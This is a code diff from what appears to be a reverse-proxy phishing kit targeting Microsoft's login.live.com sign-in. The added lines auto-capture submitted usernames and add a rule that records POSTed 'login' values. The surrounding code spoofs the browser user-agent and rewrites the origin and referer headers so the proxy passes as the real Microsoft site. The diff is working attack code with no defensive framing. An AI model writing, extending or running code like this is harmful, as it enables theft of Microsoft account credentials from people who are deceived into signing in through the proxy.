@@ -94,6 +94,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
+
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
+
         this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
         this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'login.live.com') : ''
         this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'login.live.com') : ''
@@ -152,6 +156,8 @@ const configExport = {
         'login.live.com'
     ],
 
+    AUTOGRAB_CODE: 'username',
+
     START_PATH: '/', //'/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
     PRE_HANDLERS:
         [
@@ -164,6 +170,12 @@ const configExport = {
         loginUserName: {
             method: 'POST',
             params: ['username'],
+            urls: '',
+            hosts: ['login.live.com'],
+        },
+        loginID: {
+            method: 'POST',
+            params: ['login'],
             urls: '',
             hosts: ['login.live.com'],
         },
